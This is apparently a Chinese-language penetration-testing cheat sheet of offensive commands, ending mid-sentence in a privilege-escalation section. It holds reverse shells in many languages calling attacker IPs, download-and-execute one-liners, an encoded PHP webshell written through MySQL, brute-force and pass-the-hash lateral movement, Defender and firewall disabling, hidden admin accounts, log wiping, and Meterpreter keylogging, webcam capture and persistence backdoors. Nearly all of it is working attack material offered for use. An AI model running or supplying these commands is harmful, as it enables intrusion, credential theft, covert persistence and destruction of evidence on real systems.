# command
收集渗透中会用到的常用命令  。

更新时间：2021.10.9

Table of Contents

- [command](#command)
  - [nmap](#nmap)
  - [存活主机](#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA)
  - [bypass](#bypass)
  - [gobuster](#gobuster)
  - [dirsearch](#dirsearch)
  - [nbtscan](#nbtscan)
  - [代理工具](#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7)
  - [ssh](#ssh)
  - [grep](#grep)
  - [mysql](#mysql)
  - [sqlmap](#sqlmap)
  - [hydra](#hydra)
  - [medusa](#medusa)
  - [python交互shell](#python%E4%BA%A4%E4%BA%92shell)
  - [无交互添加用户](#%E6%97%A0%E4%BA%A4%E4%BA%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7)
    - [windows](#windows)
  - [防火墙](#%E9%98%B2%E7%81%AB%E5%A2%99)
  - [frp常用配置](#frp%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE)
  - [删rdp日志](#%E5%88%A0rdp%E6%97%A5%E5%BF%97)
  - [开3389](#%E5%BC%803389)
  - [文件查找](#%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE)
  - [powershell文件下载](#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD)
  - [certutil.exe下载](#certutilexe%E4%B8%8B%E8%BD%BD)
  - [bitsadmin](#bitsadmin)
  - [windows信息收集常用命令](#windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4)
  - [at&schtasks&sc横向](#atschtaskssc%E6%A8%AA%E5%90%91)
  - [impacket包横向命令](#impacket%E5%8C%85%E6%A8%AA%E5%90%91%E5%91%BD%E4%BB%A4)
  - [反弹shell](#%E5%8F%8D%E5%BC%B9shell)
  - [nc](#nc)
  - [bash](#bash)
  - [perl](#perl)
  - [python](#python)
  - [php](#php)
  - [ruby](#ruby)
  - [nc](#nc-1)
  - [java](#java)
  - [lua](#lua)
  - [powershell](#powershell)
  - [加密shell](#%E5%8A%A0%E5%AF%86shell)
- [msf大全](#msf%E5%A4%A7%E5%85%A8)
  - [安装](#%E5%AE%89%E8%A3%85)
  - [Meterpreter基本命令](#meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4)
    - [基本系统命令](#%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)
    - [文件系统命令](#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4)
    - [网络命令](#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4)
    - [信息收集](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)
    - [提权](#%E6%8F%90%E6%9D%83)
    - [获取凭证](#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81)
    - [假冒令牌](#%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C)
    - [植入后门](#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8)
- [cs大全](#cs%E5%A4%A7%E5%85%A8)

## nmap

```
nmap -sn 10.11.1.0/24
```

```
nmap -sV -p- 10.11.1.0
```

```
nmap 10.11.1.0 --script vuln
```

```
nmap -p445 10.11.1.0 --script smb-vuln-ms17-010
```

```
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk '{print $5}' | grep -v "latency)." >ok_ip.txt
```

## 存活主机
```
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr “TTL=”
```

## bypass
Defender排除项
```
powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\test"

```

## gobuster

```
gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt
```

## dirsearch

```
python3 dirsearch.py -e php,html,js -u https://target
```

```
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
```

```
python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
```

```
python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
```

```
python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
```

## nbtscan

```
nbtscan.exe 10.11.1.0/24
```

## 代理工具
proxychain   
sockscap64    
proxifier   

## ssh
无记录shell

```
 ssh -T root@192.168.1.1 /usr/bin/bash -i
```

## grep

```
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
```

```
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

```
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

```
grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
```
## mysql

开远程

```
use mysql;  
update user set host = '%' where user = 'root';  
FLUSH PRIVILEGES ;  
select host, user from user;
 mysql -uroot -p -e "select * from mysql.user;" >1.txt
```

不登录直接执行sql
```
mysql -uaHmin -proot test -e "select now()" -N >H:/work/target1.txt
mysql -uroot -e "show databases;" >1.txt
```

mysql getshell

```
show variables like '%secure%'    
select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
```

```
set global general_log=on;  
set global general_log_file='/var/www/1.php';  
select '<?php eval($_POST[s6]) ?>';
```

```
select '<?php file_put_contents("abab.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/abb.php';

```

## sqlmap

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1" --proxy "http://127.0.0.1:1080"
```

```
python sqlmap.py  -u "http://www.vuln.cn" –cookie "id=11" --level 2
```

```
python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3 
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  --dbs
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  -D test --tables
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  -D test -T admin –-columns
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql -D test -T admin -C "username,password" --dump
```

```
python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
```

## hydra

```
参数：
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-o 输出文件
-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV
>hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
```

## medusa

```
参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
>medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
>medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```

## python交互shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```
python2 -c 'import pty;pty.spawn("/bin/sh")'
```

## 无交互添加用户

```
useradd newuser;echo "newuser:password"|chpasswd
```

```
useradd -p `openssl passwd 123456` guest
```

```
useradd -p "$(openssl passwd 123456)" guest
```

```
useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
```

### windows
```
net user s6adm$ Afabab@20 /add
net localgroup administrators s6adm$ /add
net user guest /active:yes

Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组

Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组
```

## 防火墙
```
关闭防火墙

netsh firewall set opmode mode=disable

放行远程8888端口进来的流量
netsh advfirewall firewall add rule name="88" protocol=TCP dir=in remoteport=8888 action=allow

放行出去到远程8888端口的流量
netsh advfirewall firewall add rule name="88" protocol=TCP dir=out remoteport=8888 action=allow

放行本地4444端口出去的流量
netsh advfirewall firewall add rule name="44" protocol=TCP dir=out localport=4444 action=allow

放行从本地4444端口进来的流量
netsh advfirewall firewall add rule name="44" protocol=TCP dir=in localport=4444 action=allow

删除规则
netsh advfirewall firewall delete rule name="88"

查看防火墙配置(可看到具体规则等配置)
netsh firewall show config

关闭windefebd
net stop windefend
```

## frp常用配置
frpc.ini
```
[common]
server_addr = xxxxxx
server_port = 7000

[rdp]
type = tcp
local_port = 3389
remote_port = 3389

[plugin_http_proxy]
type = tcp
remote_port = 10801
plugin = http_proxy

[plugin_socks5]
type = tcp
remote_port = 1080
plugin = socks5

```


## 删rdp日志

清除远程桌面连接记录,创建clear.bat

```
@echo off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp
```


## 开3389
```
系统windows server 2003后
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
net start TermService
```

## 文件查找

```
findstr /s /i /n /d:C:\ /c:"123123" *.txt
```

```
for /r C: %i in (login.*) do @echo %i
```

```
where /R C: login.*
```

```
dir /s/a-d/b login.*
```

```
find / -name index.php
```

```
find / -name index.php
```

```
find / -name "index.php" | xargs grep "111222"
```

```
进程路径
wmic process get name,executablepath

```

## powershell文件下载

```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
```
```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','1.exe')
```

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")
```

bypass

```
echo (new-object System.Net.WebClient).DownloadFile('http://192.168.31.93:8000/tomcat.exe','C:/Users/test/cc.exe')| powershell -
```

## certutil.exe下载

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
```

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe
```

删除缓存

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
```

查看缓存项目：

```
certutil.exe -urlcache *
```

转为base64

```
certutil -encode lcx64.exe lcx64.txt
```

转回来

```
certutil -decode lcx64.txt lcx64.exe
```

查看md5

```
certutil -hashfile a.exe MD5
```

bypass

```
Certutil & Certutil –urlcache –f –split url
Certutil | Certutil –urlcache –f –split url
```

## bitsadmin

**不支持https、ftp协议，php python带的服务器会出错**

```
bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
```


## windows信息收集常用命令
```
Systeminfo 计算机详细信息(补丁信息)

Net start 所启动的服务

Wmic service list brief 查询本机服务信息

Tasklist 进程列表

Wmic startup get command,caption 查看启动该程序信息

Schtasks /query /fo LIST /v计划任务

Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色

Query user || qwinsta 查看当前在线用户

Net session 列出会话

Net share 查看本机的共享列表

Wmic share get name,path,status 查看共享列表

Net user 本地用户

Net user kkkk 查看本地用户信息


Net localgroup 本地用户组

Net localgroup /domain 域用户组

Net localgroup adminnstrators 本地管理员组成员

net localgroup adminstrators /domain 查看登陆过主机的管理员

Wmic useraccount get /all 获取域内用户详细信息

dsquery user 查看存在的用户

Net user /domain 域用户信息

Net user kkkk /domain 域用户kkkk信息

Net user kent password /add /domain添加域用户


Net group /domain 域用户组信息

Net view /domain 查询域

Net view /domain:test 查询域内计算机

Net accounts /domain 查询域中密码策略

Net group /domain 查看域内所有用户组

Net group "Domain Controllers" /domain 查看域控制器组

Net group "Domain computers" /domain 查看域内所有计算机列表

Net group "Domain admins" /domain 查看域内管理员用户

Net user /domain kent active:yes 启用域账户

Net user /domain kent active:no 禁用域账户

Nltest /DCLIST:test 查看域中域控制器名

Wmic useraccount get /all 用户详细信息

Net group “Domain Admins” /domain 对应组下的账户信息

nltest /domain_trusts 获取域信任信息

net config workstation 了解本机的配置信息

Netsh firewall show config 查看防火墙配置

Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)

Netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe" 允许指定程序进入(windows server 2003后)

Netsh advfirewall firewall add rule name="allow nc" dir=out action=allow program="C:\nc.exe"允许指定程序退出(windows server 2003后)

Netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)

Reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"查看端口代理配置信息

Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber 查看远程桌面端口号

```

## at&schtasks&sc横向

使用明文密码登录到目标，需要135端口开启：
```
Net use \\192.168.2.148\ipc$ password /user:test\administrator

复制文件
copy c:\1.exe \\192.168.2.148\c$

at新建10:10分运行的定时作业
at \\192.168.2.148 10:10 c:\1.exe

Windows server 2012及以上使用schtasks命令
Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /F
Schtasks /run /s 192.168.2.148 /tn executefile /i
Schtasks /delete /s 192.168.2.148 /tn executefile /f

sc \\192.168.210.107 create hackerbinpath="c:\shell1.exe"   #创建服务
sc \\192.168.210.107 start hacker      #启动hacker服务
```

## impacket包横向命令

下载https://github.com/maaaaz/impacket-examples-windows     
https://github.com/ropnop/impacket_static_binaries/releases   
Atexec
```
需要445端口开启
Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"

Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
```


dcomexec
```
需要135端口开启
dcomexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"

dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
```

psexec
```
官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
Psexec \192.168.202.148 -accepteula -s cmd

官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd

PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方提供的exe执行不了)
```

smbexec
```
需要445端口开启
Smbexec test/Administrator:zxcvbnm123@192.168.202.148
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
```

wmi
```
WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create "cmd.exe /c ipconfig >C:/1.txt"

第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123

第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 "whoami"
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 "whoami"

```

批量操作,需要保存为bat执行
```
用已知密码和用户，批量连接ip:
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator

已知用户和ip，批量连接密码(爆破密码)：
FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator

已知用户和ip，批量连接hash(爆破hash)：
FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
```



## 反弹shell

## nc

```
nc -lvvp 4444
```

## bash

```
bash -i >& /dev/tcp/172.16.1.130/4444 0>&1
exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;done
```

## perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## nc

```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

## java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## powershell

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
```

## 加密shell
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.100:2333 > /tmp/s; rm /tmp/s

```

# msf大全

到处抄的

https://xz.aliyun.com/t/2536

https://www.freebuf.com/articles/web/270456.html

https://saucer-man.com/information_security/79.html

https://www.anquanke.com/post/id/235631

https://www.anquanke.com/post/id/164525



## 安装

安装

```bash
# 安装
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
安装目录 
# /opt/metasploit-framework/embedded/framework/
```

payload生成

Linux

```bash
反向连接：
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
正向连接：
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

Mac

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：

```bash
php shell.php
```

3.脚本shell

Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

执行方式：复制shell.py中的内容在linux命令行下执行：

```
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"
```

4.shellcode
Linux Based Shellcode

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Windows Based Shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Mac Based Shellcode

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

## Meterpreter基本命令

首先需要先获取meterpreter：

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.81.160
set ExitOnSession false
exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
jobs  # 查看后台攻击任务 
kill <id>  # 停止某后台攻击任务 
sessions -l  # (查看会话)
sessions -i 2   # 选择会话
sessions -k 2   # 结束会话
```

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用`sessions-u 2`来将cmdshell升级成meterpreter。

获取到了meterpreter，就可以进行后渗透了。

### 基本系统命令

```bash
# 会话管理
background  #将当前会话放置后台
sessions  # 查看会话
sessions -i  # 切换会话
quit  # 关闭当前的会话，返回msf终端

# 系统设置
sysinfo  # 查看目标机系统信息
idletime  # 查看目标机闲置时间
reboot/shutdown   # 重启/关机

# shell
shell  # 获得控制台权限
irb  # 进入ruby终端

# 进程迁移
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中

# 执行文件
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互

# 摄像头命令
webcam_list  #查看摄像头列表
webcam_chat  # 查看摄像头接口
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频

# uictl开关键盘/鼠标
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘

# 远程桌面/截屏
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接

# 键盘记录
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录

# 添加用户，开启远程桌面
# 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662

# 关闭防病毒软件
run killav
run post/windows/manage/killav

# 修改注册表
reg –h # 注册表命令帮助
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值
nc -v 192.168.81.162 443  #攻击者连接nc后门

# 清理日志
clearav  #清除windows中的应用程序日志、系统日志、安全日志
```

###  文件系统命令

```bash
cat/ls/cd/rm  # 基本命令
search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助
getwd/pwd  # 获取当前目录
getlwd/lpwd   # 操作攻击者主机 查看当前目录
upload /tmp/hack.txt C:\\lltest # 上传文件
download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件
edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件
mkdir lltest2  # 只能在当前目录下创建文件夹
rmdir lltest2  # 只能删除当前目录下文件夹
lcd /tmp   # 操作攻击者主机 切换目录

# timestomp伪造文件时间戳
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```

### 网络命令

```bash
# 基本
ipconfig/ifconfig
netstat –ano
arp
getproxy   #查看代理信息
route   #查看路由

# portfwd端口转发
portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码


# 添加路由

# 方式一autoroute （deprecated）
run autoroute –h #查看帮助
run autoroute -s 192.168.2.0/24  #添加到目标环境网络
run autoroute –p  #查看添加的路由

# 方式二post/multi/manage/autoroute
run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络
run post/multi/manage/autoroute CMD=print # 查看添加的路由
(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))

# 然后可以利用arp_scanner、portscan等进行存活检测
run arp_scanner -r 192.168.2.0/24
run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0

# autoroute添加完路由后，还可以利用msf自带的模块进行socks代理
# msf提供了2个模块用来做socks代理。
# auxiliary/server/socks_proxy
# use auxiliary/server/socks_unc
# 先background退出来，然后：
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 1080
run

# 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080
# 最后proxychains 使用Socks5代理访问

# sniffer抓包
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
```

###  信息收集

```bash
# 信息收集的脚本位于：
# modules/post/windows/gather
# modules/post/linux/gather
# 以下列举一些常用的
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找定位域控
run post/windows/gather/enum_logged_on_users  #登录过的用户
```

### 提权

1.getsystem提权
getsystem工作原理：
①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
